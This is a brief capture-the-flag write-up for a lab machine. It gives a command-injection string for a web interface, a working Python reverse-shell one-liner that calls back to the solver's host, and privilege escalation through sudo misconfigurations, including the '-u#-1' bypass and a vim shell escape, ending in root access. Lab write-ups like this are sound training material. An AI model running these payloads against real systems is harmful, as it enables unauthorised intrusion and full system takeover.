# CTF Challenge Writeup

## Challenge Overview
In this challenge, you need to use a combination of tools and techniques to find hidden information and extract the final flag.

## Steps to Solve the Challenge

### Step 1: Scan the IP with Nmap
First, you need to scan the target IP address to find open ports. Use Nmap to perform this scan.

```bash
nmap -sV <target-ip>
```

### Step 2: Access the Web Server on Port 8080
Navigate to the web server running on port 8080.

```bash
http://<target-ip>:8080
```

### Step 3: Execute a Command
Use the web interface to execute a command. For example, list the files in the current directory.

```sh
\';ls ; echo '1+1
```

### Step 4: Establish a Reverse Shell in Python3
Execute a reverse shell command to gain a shell on the target machine.

```sh
; python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("your-ip",12345));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

### Step 5: Check Sudo Permissions
Check the sudo permissions to see if you can run `42sh` as the user `manu`.

```sh
sudo -l
```

### Step 6: Run `42sh` as `manu`
Run `42sh` with sudo to gain elevated privileges.

```sh
sudo -u manu /home/manu/42sh -p
```

### Step 7: Check Sudo Permissions Again
Check the sudo permissions again to see if you can run `vim` as `manu`.

```sh
sudo -l
```

### Step 8: Run `vim` with Sudo
Run `vim` with sudo to gain elevated privileges.

```sh
sudo -u#-1 /usr/bin/vi /home/manu/user.txt
```

### Step 9: Get a Shell from `vim`
Once inside `vim`, execute a shell command to get a root shell.

```vim
:!bash
```

### Step 10: Find the `root.txt` File in `/root`
Navigate to the `/root` directory and find the `root.txt` file.

```sh
cd /root
cat root.txt
```